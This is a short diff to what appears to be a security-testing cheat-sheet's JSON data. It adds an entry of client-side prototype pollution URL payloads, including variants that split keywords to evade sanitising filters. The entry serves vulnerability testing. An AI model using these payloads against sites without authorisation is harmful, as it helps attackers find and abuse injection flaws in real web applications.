@@ -81,6 +81,19 @@
         ]
     },
     {
+        "title": "PROTOTYPE POLLUTION: CLIENT SIDE",
+        "subtitle": "The following are payloads for clientside prototype pollution <br> Use this code to check it the injected payload reflects <br> <br> Object.prototype ",
+        "commands": [
+            "?__proto__[foo]=bar",
+            "?__proto__.foo=bar",
+            "?constructor.prototype.foo=bar",
+            "?__pro__proto__to__[foo]=bar",
+            "?__pro__proto__to__.foo=bar",
+            "?constconstructorructor[protoprototypetype][foo]=bar",
+            "?constconstructorructor.protoprototypetype.foo=bar"
+        ]
+    },
+    {
         "title": "PROTOTYPE POLLUTION: JSON SPACES",
         "subtitle": "Tampers with json response spacing",
         "commands": [
